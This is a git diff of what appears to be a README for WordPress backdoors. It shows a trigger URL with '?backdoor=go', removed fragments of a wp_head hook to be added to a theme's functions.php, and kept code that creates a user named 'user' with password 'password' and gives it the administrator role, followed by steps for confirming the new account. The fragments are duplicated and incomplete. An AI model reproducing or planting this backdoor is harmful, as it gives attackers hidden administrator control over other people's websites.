@@ -85,28 +85,6 @@ https://www.targetdomain.com?backdoor=go
 
 
 
-
-
-
-```bash
-
-add_action( 'wp_head', 'my_backdoor' );
-## Backdoor-03 (add to theme functions.php)
-
-
-
-
-
-
-```bash
-
-## Backdoor-03 (add to theme functions.php)
-
-
-
-
-
-
 ```bash
 
 $new_user = new Wp_User(wp_create_user('user','password'));
@@ -116,6 +94,7 @@ $new_user->set_role('administrator');
 
 
 ```
+![Logo](https://github.com/cyber-insect99/photo-gallery-/blob/main/backdoor%20on%20wp%20site.png?raw=true)
 - Then go to use option on wordpress deshboard the you will see  a new user .
 - User: user
  - Password: password
